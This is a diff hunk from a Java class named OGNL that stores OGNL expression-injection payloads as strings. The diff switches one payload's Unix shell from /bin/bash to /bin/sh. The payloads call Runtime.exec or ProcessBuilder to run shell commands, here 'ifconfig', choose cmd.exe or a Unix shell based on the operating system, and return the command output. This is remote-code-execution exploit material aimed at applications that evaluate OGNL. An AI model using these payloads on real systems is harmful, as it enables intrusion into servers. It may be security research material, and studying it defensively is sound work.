@@ -28,7 +28,7 @@ public class OGNL {
         String StreamUtilsPayload = "{(new java.lang.String(@org.springframework.util.StreamUtils@copyToByteArray(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())))}";
 
         // processBuilder形式构建
-        String processBuilderPayload1 = "(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))";
+        String processBuilderPayload1 = "(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))";
         String processBuilderPayload2 = "{(#iswin=(new java.lang.Boolean(\"true\")).booleanValue())?(#cmds=(new java.lang.String[]{\"cmd.exe\",\"/c\",\"ipconfig\"})):(#cmds=(new java.lang.String[]{\"/bin/bash\",\"-c\",\"ifconfig\"})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(new java.io.ByteArrayOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
 
         /**
